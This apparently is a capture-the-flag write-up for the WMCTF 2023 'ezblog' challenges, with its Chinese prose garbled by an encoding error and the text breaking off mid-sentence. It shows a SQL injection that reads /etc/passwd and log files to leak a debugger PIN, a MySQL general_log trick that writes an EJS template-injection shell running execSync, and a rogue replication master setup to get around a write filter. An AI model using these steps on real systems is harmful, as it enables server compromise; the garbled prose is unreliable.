æ˜¯åœ¨å¯åŠ¨æ—¶ç”Ÿæˆçš„ï¼Œå¯ä»¥åœ¨æ§åˆ¶å°çœ‹åˆ°ï¼Œä½†æ˜¯ä¸ä¼šåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºï¼Œéœ€è¦è‡ªå·±è¾“å…¥ï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢åˆ«äººç›´æ¥çœ‹åˆ°å¯†ç ï¼Œä½†æ˜¯åˆå¯ä»¥è®©è‡ªå·±çŸ¥é“å¯†ç ï¼Œæ–¹ä¾¿è°ƒè¯•</span></span><br><span class="line"><span class="keyword">let</span> pin = (<span class="number">0</span>, uuid_1.<span class="property">v4</span>)();</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/debugger/auth&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="keyword">if</span> (username === <span class="string">&quot;debugger&quot;</span> &amp;&amp; password === pin) &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: token</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">401</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;Error: incorrect pin&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="literal">null</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­éœ€è¦pinä¸ºéšæœºç”Ÿæˆçš„uuidï¼Œéœ€é€šè¿‡æŸç§æ–¹å¼è·å–ï¼Œé‰´æƒæˆåŠŸåä¼šå¼€å¯ä¸‰ä¸ªæ–°åŠŸèƒ½</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &quot;execute&quot; python where python is a kind of snake</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/debugger/python/execute&quot;</span>, requireAuth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (python_count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        python_count--;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="string">&quot;Killed&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="string">&quot;Error: you have killed all the snakes&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// è°ƒè¯•SQLè¯­å¥</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/debugger/sql/execute&quot;</span>, requireAuth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> sql = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line">    <span class="comment">// é˜²æ­¢æ¶æ„sql</span></span><br><span class="line">    <span class="keyword">const</span> waf = [<span class="string">&#x27;into&#x27;</span>, <span class="string">&#x27;outfile&#x27;</span>, <span class="string">&#x27;dumpfile&#x27;</span>];</span><br><span class="line">    <span class="keyword">let</span> filtered = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (waf.<span class="title function_">some</span>(<span class="function">(<span class="params">w</span>) =&gt;</span> &#123; filtered = w; <span class="keyword">return</span> sql.<span class="title function_">toLowerCase</span>().<span class="title function_">includes</span>(w); &#125;)) &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">500</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;Hack!!&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="string">`Error: &#x27;<span class="subst">$&#123;filtered&#125;</span>&#x27; is not allowed`</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/execute|immediate/igm</span>.<span class="title function_">test</span>(sql)) &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">500</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;Hack!!&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="string">`Error: éé¢„æœŸ is fixed`</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    db_1.<span class="property">connection</span>.<span class="title function_">query</span>(sql, <span class="function">(<span class="params">err, results, fields</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            res.<span class="title function_">json</span>(&#123;</span><br><span class="line">                <span class="attr">code</span>: <span class="number">500</span>,</span><br><span class="line">                <span class="attr">message</span>: <span class="string">&quot;Internal Server Error&quot;</span>,</span><br><span class="line">                <span class="attr">data</span>: err?.<span class="property">message</span></span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: results</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// è°ƒè¯•æ¨¡æ¿</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/debugger/template/test&quot;</span>, requireAuth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> file = req.<span class="property">body</span>.<span class="property">file</span>;</span><br><span class="line">        <span class="comment">// é˜²æ­¢è·¯å¾„ç©¿è¶Šé€ æˆéé¢„æœŸ</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^a-zA-Z0-9_]/gm</span>.<span class="title function_">test</span>(file)) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Error: &#x27;<span class="subst">$&#123;file&#125;</span>&#x27; is invalid name`</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> posts = <span class="keyword">await</span> (<span class="number">0</span>, posts_1.<span class="property">getPosts</span>)();</span><br><span class="line">        <span class="keyword">let</span> post = posts.<span class="property">length</span> &gt; <span class="number">0</span> ? posts[<span class="number">0</span>] : <span class="literal">null</span>;</span><br><span class="line">        res.<span class="title function_">render</span>(file, &#123;</span><br><span class="line">            post, posts</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>/api/debugger/sql/execute</code>å¯æ‰§è¡Œä»»æ„sqlè¯­å¥ï¼Œä½†ä¸èƒ½å‡ºç°<code>&#39;into&#39;, &#39;outfile&#39;, &#39;dumpfile&#39;</code>ï¼Œ<code>/api/debugger/template/test</code>å¯æŒ‡å®šä½¿ç”¨æŸä¸ªejsæ¨¡æ¿è¿›è¡Œæ¸²æŸ“ï¼Œå¹¶è¿”å›æ¸²æŸ“åçš„ç»“æœã€‚</p><p>æ€è·¯å°±æœ‰äº†</p><ul><li>é€šè¿‡sqlæ¨¡å—è¦†ç›–åŸæœ‰ejsæ¨¡æ¿æˆ–è€…å†™å…¥æ–°çš„ejsæ¨¡æ¿</li><li>åœ¨ejsæ¨¡æ¿é‡Œæ„é€ sstiï¼Œæ‰§è¡Œ<code>/readflag</code></li><li>é€šè¿‡temolateæ¨¡å—æŒ‡å®šæ¸²æŸ“æ¨¡æ¿ä¸ºæ„é€ çš„æ¶æ„æ¨¡æ¿ï¼Œå¹¶è¿”å›æ¸²æŸ“ç»“æœ</li></ul><p>ç¼–è¾‘å¸–å­åŠŸèƒ½ï¼Œidå¯æ§ï¼Œå«æœ‰æ•°å­—å°±èƒ½é€šè¿‡æ­£åˆ™æ ¡éªŒï¼Œä¹‹åé€šè¿‡<code>getPostById</code>æ¥æ”¶idå¹¶æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/post/:id/edit&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// parseIntçš„æ€§èƒ½é—®é¢˜ https://dev.to/darkmavis1980/you-should-stop-using-parseint-nbf</span></span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">params</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="regexp">/\d+/igm</span>.<span class="title function_">test</span>(id) || <span class="regexp">/into|outfile|dumpfile/igm</span>.<span class="title function_">test</span>(id)) &#123; <span class="comment">// åˆ¤æ–­ idæ˜¯å¦æ˜¯çº¯æ•°å­—</span></span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">`Error: &#x27;<span class="subst">$&#123;id&#125;</span>&#x27; is invalid id`</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// idåªèƒ½ä¸ºæ•°å­—ï¼Œå¯ä»¥å®‰å…¨çš„è½¬ä¸ºnumberï¼Œé¿å…parseInté™ä½æ€§èƒ½</span></span><br><span class="line">        <span class="keyword">let</span> post = <span class="keyword">await</span> (<span class="number">0</span>, posts_1.<span class="property">getPostById</span>)(id);</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&quot;edit&quot;</span>, &#123;</span><br><span class="line">            post</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getPostById</span>(<span class="params">id</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ number ç±»å‹çš„ id ä¸ä¼šå¯¼è‡´ sql æ³¨å…¥ï¼Œå› ä¸ºæ•°å­—ç±»å‹åªæœ‰0-9çš„æ•°å­—ï¼Œæ— æ³•æ„é€ sqlè¯­å¥</span></span><br><span class="line">        <span class="comment">// TypeScriptå¯ä»¥ç¡®ä¿ä¼ å…¥ç±»å‹åªèƒ½ä¸ºnumberï¼Œä¸èƒ½ä¸ºå­—ç¬¦ä¸²ï¼Œå¦‚æœä¸ºå­—ç¬¦ä¸²ï¼Œå°†ä¼šå‘ç”Ÿç¼–è¯‘æ—¶é”™è¯¯å¯¼è‡´tscæ— æ³•ç¼–è¯‘ï¼Œæ‰€ä»¥æ˜¯å®‰å…¨çš„</span></span><br><span class="line">        db_1.<span class="property">connection</span>.<span class="title function_">query</span>(<span class="string">`select * from Posts where id = `</span> + id, <span class="function">(<span class="params">err, results</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                <span class="title function_">reject</span>(err);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (results.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Post not found&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="title function_">resolve</span>(&#123;</span><br><span class="line">                        <span class="attr">id</span>: results[<span class="number">0</span>].<span class="property">id</span>,</span><br><span class="line">                        <span class="attr">title</span>: results[<span class="number">0</span>].<span class="property">title</span>,</span><br><span class="line">                        <span class="attr">content</span>: results[<span class="number">0</span>].<span class="property">content</span></span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ <code>load_file()</code>å®ç°ä»»æ„æ–‡ä»¶è¯»å–,<code>/</code>éœ€è¦urlç¼–ç ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/post/-1 union select 1,load_file(&#x27;%2Fetc%2Fpasswd&#x27;),3/edit</span><br></pre></td></tr></table></figure><p>å¦‚ä½•æ‰¾å¯»pinç ï¼Ÿ</p><p>Dockerfileé‡Œå‘ç°é¢˜ç›®é‡‡ç”¨<code>pm2</code>è¿›è¡Œnodeè¿›ç¨‹ç®¡ç†ï¼Œæœ¬åœ°æ­å»ºdockerå‘ç°è¾“å‡ºäº†ä¸¤ä¸ªpm2çš„æ—¥å¿—æ–‡ä»¶</p><p><a href="https://imgse.com/i/pPJnF8P"><img src="https://s1.ax1x.com/2023/08/22/pPJnF8P.png" alt="pPJnF8P.png"></a></p><p><code>&quot;åªè¦é€šè¿‡PM2 å¯åŠ¨çš„Node.jsé¡¹ç›®ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿çš„æŸ¥çœ‹å…¶è¾“å‡ºæ—¥å¿—ã€‚&quot;</code>ï¼Œè€Œåœ¨app.jsé‡Œç›´æ¥å°†pinç ç›¸å…³ä¿¡æ¯è¿›è¡Œè¾“å‡ºï¼Œæ‰€ä»¥åœ¨pm2çš„è¾“å‡ºæ—¥å¿—<code>main-out.log</code>å°±èƒ½æ‰¾åˆ°pinç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// ä¿®å¤å›¾åºŠåŠŸèƒ½ä¸Šä¼ å›¾ç‰‡å¤±è´¥çš„é—®é¢˜</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        child_process_1.<span class="property">default</span>.<span class="title function_">execSync</span>(<span class="string">&quot;mkdir -p ./public/images&quot;</span>);</span><br><span class="line">        child_process_1.<span class="property">default</span>.<span class="title function_">execSync</span>(<span class="string">&quot;chmod -R 777 .&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (e) &#123; &#125;</span><br><span class="line">    (<span class="number">0</span>, db_1.<span class="property">init</span>)();</span><br><span class="line">    app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; * Serving Express app &#x27;ezblog&#x27;&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; * Debug mode: on&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; * Running on http://0.0.0.0:3000/ (Press CTRL+C to quit)&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; * Debugger is active!&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; * Debugger PIN: &quot;</span> + pin);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°pinç åç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/post/-1 union select 1,load_file(&#x27;%2Fhome%2Fezblog%2F.pm2%2Flogs%2Fmain-out.log&#x27;),3/edit</span><br></pre></td></tr></table></figure><p>ç”±äºpassæ‰äº†<code>&#39;into&#39;, &#39;outfile&#39;, &#39;dumpfile&#39;</code>ï¼Œä¸èƒ½ç›´æ¥é€šè¿‡<code>select into outfile</code>çš„æ–¹å¼ç›´æ¥å†™æ–‡ä»¶ï¼Œä½†è¿˜å¯ä»¥åˆ©ç”¨å†™æ—¥å¿—çš„æ–¹å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;             #æŸ¥çœ‹é…ç½®</span><br><span class="line">set global general_log = on;                 #å¼€å¯general logæ¨¡å¼</span><br><span class="line">set global general_log_file = &#x27;/home/ezblog/views/post.ejs&#x27;; #è®¾ç½®æ—¥å¿—ç›®å½•ä¸ºshellåœ°å€</span><br><span class="line">select &#x27;&lt;%= process.mainModule.require(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString() %&gt;&#x27;;            #å†™å…¥shell</span><br></pre></td></tr></table></figure><p>åœ¨æ­¤ä¹‹å‰ï¼Œç”±äºç¯å¢ƒä¸ºmysqlç”¨æˆ·ï¼Œåªæœ‰infomationå’Œctfä¸¤å¼ è¡¨ï¼Œéœ€è¦æ‰‹åŠ¨åˆ›å»º<code>mysql.general_log</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>åˆ†ä¸¤æ¬¡æ‰§è¡Œ</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mysql;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mysql.general_log  (</span><br><span class="line">  `event_time` <span class="type">timestamp</span>(<span class="number">6</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">current_timestamp</span>(<span class="number">6</span>) <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  `user_host` mediumtext <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb3 <span class="keyword">COLLATE</span> utf8mb3_general_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `thread_id` <span class="type">bigint</span>(<span class="number">21</span>) UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `server_id` <span class="type">int</span>(<span class="number">10</span>) UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `command_type` <span class="type">varchar</span>(<span class="number">64</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb3 <span class="keyword">COLLATE</span> utf8mb3_general_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `argument` mediumtext <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb3 <span class="keyword">COLLATE</span> utf8mb3_general_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE <span class="operator">=</span> CSV <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8mb3 <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8mb3_general_ci COMMENT <span class="operator">=</span> <span class="string">&#x27;General log&#x27;</span> ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>;</span><br></pre></td></tr></table></figure><p>æœ€åæŒ‡å®špost.ejsæ¸²æŸ“å³å¯</p><p><a href="https://imgse.com/i/pPJnZDg"><img src="https://s1.ax1x.com/2023/08/22/pPJnZDg.png" alt="pPJnZDg.png"></a></p><h2 id="ezblog2"><a href="#ezblog2" class="headerlink" title="ezblog2"></a>ezblog2</h2><p>ä¿®æ”¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">diff --color -r env/docker/docker-compose.yml env2/docker/docker-compose.yml </span><br><span class="line">5c5 </span><br><span class="line">&lt;     image: wmctf2023_ezblog</span><br><span class="line">--- </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">    image: wmctf2023_ezblog2</span></span><br><span class="line">diff --color -r env/src/src/app.ts env2/src/src/app.ts</span><br><span class="line">248a249,251</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">    try&#123;</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">        child_process.execSync(<span class="string">&quot;chmod -R 444 /home/ezblog/views/*&quot;</span>)</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">    &#125; catch (e) &#123; &#125;</span> </span><br></pre></td></tr></table></figure><p>ä¿®æ”¹äº†ç›®å½•æƒé™ï¼Œä¸Šè¯‰æ—¥å¿—å†™å…¥æ–¹æ³•è¿˜æ˜¯èƒ½å¤ŸæˆåŠŸå†™å…¥æ–°æ–‡ä»¶ï¼Œä½†ç”±äºæ˜¯mysqlç”¨æˆ·ï¼Œå†™å…¥çš„æ–°æ–‡ä»¶æ— æƒé™è¯»ï¼Œä¹Ÿä¸èƒ½è¦†ç›–åŸæœ‰çš„æ–‡ä»¶</p><p><a href="https://imgse.com/i/pPJnnEj"><img src="https://s1.ax1x.com/2023/08/22/pPJnnEj.png" alt="pPJnnEj.png"></a></p><p>æ–°çš„åˆ©ç”¨æ–¹æ³•æ˜¯é‡‡ç”¨mysqlä¸»ä»å¤åˆ¶</p><p><a href="https://imgse.com/i/pPJnuUs"><img src="https://s1.ax1x.com/2023/08/22/pPJnuUs.png" alt="pPJnuUs.png"></a></p><p>ä¿®æ”¹ä¸»æœåŠ¡å™¨çš„binlogæ–‡ä»¶ï¼Œåœ¨ä»æœåŠ¡å™¨è¿›è¡Œæ£€æŸ¥æ—¶ï¼Œå°±ä¼šæ‰§è¡Œåœ¨ä¸»æœåŠ¡å™¨ä¸Šçš„å‘½ä»¤ï¼Œå€Ÿæ­¤ç»•è¿‡<code>into outfile</code>é™åˆ¶</p><p><strong>ä¸»æœåŠ¡å™¨</strong></p><p>æ‹‰ä¸€ä¸ªå’Œé¢˜ç›®ç‰ˆæœ¬ç›¸åŒçš„<code>mariadb:10.9.8</code></p><p>ä¿®æ”¹<code>/etc/my.cnf</code>ï¼Œæ²¡æœ‰å°±åˆ›å»ºä¸€ä¸ªï¼Œåœ¨ä¸‹é¢æ·»åŠ ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">server_id       = 2</span><br><span class="line">secure_file_priv=</span><br><span class="line">log-bin         = mysql-bin ## å¼€å¯äºŒè¿›åˆ¶æ—¥å¿—åŠŸèƒ½</span><br></pre></td></tr></table></figure><p>é‡å¯mariadbï¼Œ<code>service mariadb restart</code></p><p>åœ¨æ•°æ®åº“é‡Œé…ç½®</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;slave&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> REPLICATION SLAVE <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;slave&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> binlog_checksum <span class="operator">=</span> <span class="keyword">NONE</span>; #å…³é—­CRC32,å¦åˆ™æ‰§è¡Œæ—¶ä¼šå‡ºé”™</span><br><span class="line">reset master; #éœ€è¦é‡ç½®ä¸»æœåŠ¡å™¨ï¼Œä¸ç„¶å‰é¢åˆ›å»ºç”¨æˆ·çš„å‘½ä»¤ä¼šè¢«è®°å½•ï¼Œå¯¼è‡´æŠ¥é”™</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> database test;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> flagtable(id <span class="type">int</span>,name <span class="type">varchar</span>(<span class="number">120</span>),age <span class="type">int</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> flagtable(id, name, age) <span class="keyword">VALUES</span>(<span class="number">1</span>, <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>, <span class="number">30</span>);</span><br></pre></td></tr></table></figure><p>å› 